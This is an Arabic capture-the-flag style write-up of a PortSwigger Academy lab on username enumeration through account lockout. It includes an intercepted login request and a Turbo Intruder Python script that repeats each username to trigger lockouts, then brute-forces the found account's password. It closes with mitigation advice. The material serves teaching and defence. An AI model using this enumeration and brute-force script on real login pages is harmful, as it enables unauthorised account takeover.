# [Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)

## **`الهدف`**
معرفة اسم المستخدم الصالح من بين قائمة أسماء يوفرها موقع الـ `PortSwigger` ثم القيام بعمل `brute-force` علي كلمة المرور الخاصة بهذا المستخدم وأخيرًا تسجيل الدخول بنجاح إلى حسابه.
## **`خطوات الحل`**
**`ملاحظة:`** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder`.

سنقوم باعتراض `request` تسجيل الدخول بأى اسم وكلمة مرور عشوائيين

```http
POST /login HTTP/2
Host: 0aef004e03b2fd3d81467a4900e80049.web-security-academy.net
Cookie: session=gWDUkuaYBckHWTj2anrrLgzIQmNGAVcv

username=test&password=1234
```
ونقوم بتحويل الـ `request` إلى الـ `Turbo Intruder` ونقوم بوضع `علامة %s` بدلًا من اسم `test` ونضع أى كلمة مرور عشوائية. 

ونقوم بوضع سكريبت بايثون الذي يقرأ الكلمات من الملف الموجود على الـ `Desktop` ولكنه يُكرر كل كلمة `5` مرات
```Python
def queueRequests(target, wordlists):
    # السماح بأكثر من اتصال متوازي لتسريع العملية
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,   
                           requestsPerConnection=50, 
                           pipeline=False,            
                           engine=Engine.THREADED
                           )

    # ------------------------------------------------------------
    # هنا بقى المتغير اللي هيتحكم بعدد مرات تكرار كل كلمة
    repeat_count = 5   # <--- غيّر الرقم ده للعدد اللي انت عايزه
    # ------------------------------------------------------------

    with open(r'C:\Users\test\Desktop\username.txt', 'r') as f:
        for line in f:
            word = line.strip()
            if not word:
                continue

            # نكرر إرسال نفس الكلمة بالعدد المطلوب
            for _ in range(repeat_count):
                engine.queue(target.req, word)
                
def handleResponse(req, interesting):
    # عرض كل النتائج في الجدول بدون أي فلترة لكي نتابع كل الطلبات
    table.add(req)
```

وسنلاحظ في النتائج اختلاف في خانة الـ `Length` و `Words`  عند اسم واحد فقط  `app01` مقارنة بالبقية وعند فحص الـ `response` سنلاحظ سنلاحظ ظهور عبارة 
`You have made too many incorrect login attempts. Please try again in 1 minute(s).`

على عكس بقية الاسماء والتى يظهر بها عبارة 
`Invalid username or password.`

وهذا يعنى أننا حصلنا على الاسم الصحيح `app01 (الاسم يتغير عند كل مرة تدخل بها اللاب)`

ونقوم بعمل الـ `Brute-force` على كلمة المرور لنلاحظ في النتائج اختلاف في خانة الـ `Length` و `Words`  عند كلمة مرور واحدة فقط  `montana` مقارنة بالبقية وعند فحص الـ `response` سنلاحظ عدم وجود أي رسالة خطأ عكس البقية التى تظهر فيها رسالة 
``You have made too many incorrect login attempts. Please try again in 1 minute(s).``

لذلك ننتظر `60` ثانية لانتهاء حظر الـ `Ip` ونقوم بالعودة إلى اللاب وتسجيل الدخول إلى حساب `app01:montana` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب ألا يعتمد عداد المحاولات الفاشلة على وجود اسم المستخدم في قاعدة البيانات، وإذا أدخل شخص اسمًا غير موجود مثل `test` وحاول عدة مرات، يجب أن يتم حظر هذا الاسم الوهمي في الذاكرة المؤقتة للنظام وتظهر رسالة الخطأ ذاتها التى تظهر فى حالة وجود اسم المُستخدم لكي لا يستطيع المهاجم أن يعرف إذا كان اسم المستخدم موجود بالفعل أو غير موجود.

ويجب أن يتحقق النظام من حالة الحظر قبل التحقق من صحة كلمة المرور، وإذا كان الحساب محظورًا يجب توحيد رسالة الخطأ بغض النظر عن صحة أو خطأ كلمة المرور.

ويجب أن يُطلب من المستخدم حل كابتشا `(CAPTCHA)` بعد كل محاولتين أو ثلاث خطأ لإثبات أنه إنسان وليس اداة.

ويجب إضافة المصادقة الثنائية `Multi-Factor Authentication - MFA` حتى لا يستطيع المهاجم الدخول إلى الحساب حتى بعد معرفة اسم المستخدم وكلمة المرور.
